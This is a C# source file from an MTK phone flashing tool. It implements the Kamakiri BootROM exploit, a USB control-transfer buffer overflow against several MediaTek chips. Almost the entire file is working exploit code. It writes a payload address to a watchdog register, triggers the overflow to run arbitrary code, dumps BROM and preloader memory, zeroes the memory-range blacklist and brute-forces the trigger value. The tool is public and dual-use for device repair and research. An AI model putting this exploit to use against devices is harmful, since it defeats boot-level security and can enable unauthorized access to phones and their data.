// ============================================================================
// MultiFlash TOOL - Kamakiri Exploit
// Kamakiri 漏洞利用 | Kamakiriエクスプロイト | Kamakiri 익스플로잇
// ============================================================================
// [EN] USB control transfer exploit for MTK BROM buffer overflow
//      Affects: MTK6580, MT6739, MT6761, MT6765 and more
// [中文] MTK BROM 缓冲区溢出的 USB 控制传输漏洞
//       影响: MTK6580, MT6739, MT6761, MT6765 等芯片
// [日本語] MTK BROMバッファオーバーフロー用USBコントロール転送エクスプロイト
//         影響: MTK6580, MT6739, MT6761, MT6765など
// [한국어] MTK BROM 버퍼 오버플로우용 USB 제어 전송 익스플로잇
//         영향: MTK6580, MT6739, MT6761, MT6765 등
// ============================================================================
// ⚠️ WARNING / 警告 / 注意:
// [EN] For educational/research purposes only. Use responsibly.
// [中文] 仅供教育/研究用途。请负责任地使用。
// [日本語] 教育/研究目的のみ。責任を持って使用してください。
// ============================================================================
// GitHub: https://github.com/xiriovo/edlormtk
// Contact: QQ 1708298587 | Email: 1708298587@qq.com
// License: MIT
// ============================================================================

using System;
using System.Threading.Tasks;
using LibUsbDotNet;
using LibUsbDotNet.Main;
using LibUsbDotNet.LudnMonoLibUsb;
using tools.Modules.MTK.Protocol;
using tools.Modules.MTK.Models;

namespace tools.Modules.MTK.Exploit
{
    /// <summary>
    /// Kamakiri Exploit - USB control transfer BROM buffer overflow
    /// Kamakiri 漏洞利用 - USB 控制传输 BROM 缓冲区溢出
    /// </summary>
    public class Kamakiri : ExploitBase
    {
        private readonly UsbDevice? _device;

        public Kamakiri(PreloaderProtocol preloader, ChipConfig chipConfig, UsbDevice? device = null)
            : base(preloader, chipConfig)
        {
            _device = device;
        }

        /// <summary>
        /// 执行 Kamakiri 漏洞利用
        /// 步骤:
        /// 1. 写入 Payload 地址到 Watchdog+0x50
        /// 2. 读取触发漏洞
        /// 3. 发送 Payload 数据
        /// 4. USB 控制传输触发执行
        /// </summary>
        public override bool Exploit(byte[] payload, uint payloadAddr)
        {
            try
            {
                Log($"Starting Kamakiri exploit, payload addr: 0x{payloadAddr:X}");

                // 写入 Payload 地址到 Watchdog+0x50 寄存器
                uint addr = ChipConfig.Watchdog + 0x50;
                Preloader.Write32(addr, ReverseBytes(payloadAddr));
                Log($"Written payload addr to watchdog+0x50 (0x{addr:X})");

                // 循环读取触发漏洞
                for (int i = 0; i < 0xF; i++)
                {
                    uint readAddr = addr - (uint)((0xF - i) * 4);
                    int count = 0xF - i + 1;
                    Preloader.Read32(readAddr, count);
                }

                // 发送 Payload 命令
                Preloader.Echo(new byte[] { 0xE0 });

                // 发送 Payload 长度 (大端)
                byte[] lenBytes = BitConverter.GetBytes(payload.Length);
                if (BitConverter.IsLittleEndian)
                {
                    Array.Reverse(lenBytes);
                }
                Preloader.Echo(lenBytes);

                // 读取状态
                var status = Preloader.ReadWord();
                if (status != 0)
                {
                    Log("Error: Payload too large");
                    return false;
                }

                // 发送 Payload 数据
                Preloader.Write(payload);
                Preloader.ReadWord(); // 读取确认
                Preloader.ReadWord();

                Log("Payload sent, triggering USB control transfer...");

                // USB 控制传输触发执行
                if (_device != null)
                {
                    TriggerViaUsb();
                }

                Log("Kamakiri exploit completed");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Kamakiri exploit failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// USB 控制传输触发漏洞执行
        /// </summary>
        private void TriggerViaUsb()
        {
            try
            {
                // USB 控制传输: bmRequestType=0xA1, bRequest=0, wValue=0, wIndex=var1
                var setup = new UsbSetupPacket(0xA1, 0, 0, (short)ChipConfig.Var1, 0);

                // 发送控制传输 (预期会失败，因为设备会崩溃重启)
                int bytesTransferred;
                _device?.ControlTransfer(ref setup, IntPtr.Zero, 0, out bytesTransferred);
            }
            catch
            {
                // 预期会抛出异常
            }
        }

        /// <summary>
        /// 运行 Payload
        /// </summary>
        public override async Task<bool> RunPayloadAsync(byte[] payload, uint? addr = null)
        {
            uint payloadAddr = addr ?? ChipConfig.BromPayloadAddr;
            byte[] fixedPayload = FixPayload(payload, false);

            Log($"Running payload at 0x{payloadAddr:X}...");

            if (Exploit(fixedPayload, payloadAddr))
            {
                await Task.Delay(200);

                // 等待确认
                var ack = Preloader.ReadDword();
                if (ack == 0xA1A2A3A4)
                {
                    Log("Payload executed successfully");
                    return true;
                }
                else
                {
                    Log($"Unexpected response: 0x{ack:X}");
                }
            }

            return false;
        }

        /// <summary>
        /// Dump BROM
        /// </summary>
        public override async Task<byte[]?> DumpBromAsync(uint length = 0x20000)
        {
            try
            {
                Log($"Dumping BROM, length: 0x{length:X}...");

                // 读取长度
                var lenBytes = Preloader.ReadBytes(4);
                uint actualLen = BitConverter.ToUInt32(lenBytes, 0);
                if (BitConverter.IsLittleEndian)
                {
                    actualLen = ReverseBytes(actualLen);
                }

                Log($"BROM reports length: 0x{actualLen:X}");

                // 读取数据
                byte[] brom = new byte[actualLen];
                uint rlen = Math.Min(actualLen, 0x20000);

                for (uint i = 0; i < actualLen; i += rlen)
                {
                    uint toRead = Math.Min(rlen, actualLen - i);
                    var chunk = Preloader.ReadBytes((int)toRead);
                    Array.Copy(chunk, 0, brom, i, chunk.Length);

                    int progress = (int)(i * 100 / actualLen);
                    Log($"Progress: {progress}%");
                }

                Log("BROM dump completed");
                return brom;
            }
            catch (Exception ex)
            {
                Log($"BROM dump failed: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Dump Preloader
        /// </summary>
        public override async Task<byte[]?> DumpPreloaderAsync()
        {
            try
            {
                Log("Dumping Preloader...");

                // 读取长度
                var lenBytes = Preloader.ReadBytes(4);
                uint length = BitConverter.ToUInt32(lenBytes, 0);

                if (length == 0)
                {
                    Log("Preloader length is 0");
                    return null;
                }

                // 读取数据
                var data = Preloader.ReadBytes((int)length);

                // 查找 MTK_BLOADER_INFO 获取文件名
                int idx = FindPattern(data, System.Text.Encoding.ASCII.GetBytes("MTK_BLOADER_INFO"));
                if (idx != -1)
                {
                    string filename = System.Text.Encoding.ASCII.GetString(data, idx + 0x1B, 0x30).TrimEnd('\0');
                    Log($"Found preloader: {filename}");
                }

                Log("Preloader dump completed");
                return data;
            }
            catch (Exception ex)
            {
                Log($"Preloader dump failed: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// 禁用内存黑名单
        /// </summary>
        public override bool DisableRangeBlacklist()
        {
            try
            {
                Log("Disabling range blacklist via Kamakiri...");

                // 通过 Kamakiri 漏洞绕过黑名单检查
                // 具体实现依赖于芯片配置中的 blacklist 地址

                if (ChipConfig.Blacklist == null || ChipConfig.Blacklist.Count == 0)
                {
                    Log("No blacklist configuration");
                    return true;
                }

                // 将黑名单区域设置为无效值
                foreach (var blAddr in ChipConfig.Blacklist)
                {
                    Preloader.Write32(blAddr + 0x8, 0); // 起始地址
                    Preloader.Write32(blAddr + 0xC, 0); // 结束地址
                }

                Log("Blacklist disabled");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Failed to disable blacklist: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 暴力破解 var1 值
        /// </summary>
        public async Task<int> BruteforceVar1(byte[] payload, int startVar1 = 0x0A)
        {
            Log($"Starting var1 bruteforce from 0x{startVar1:X}...");

            for (int var1 = startVar1; var1 <= 0xFF; var1++)
            {
                Log($"Trying var1 = 0x{var1:X}...");

                // 保存原始 var1
                uint originalVar1 = ChipConfig.Var1;

                try
                {
                    ChipConfig.Var1 = (uint)var1;

                    if (await RunPayloadAsync(payload))
                    {
                        Log($"Found working var1: 0x{var1:X}");
                        return var1;
                    }
                }
                catch
                {
                    // 继续尝试
                }
                finally
                {
                    ChipConfig.Var1 = originalVar1;
                }

                await Task.Delay(100);
            }

            Log("Bruteforce failed, no working var1 found");
            return -1;
        }

        private static int FindPattern(byte[] data, byte[] pattern)
        {
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }
    }
}
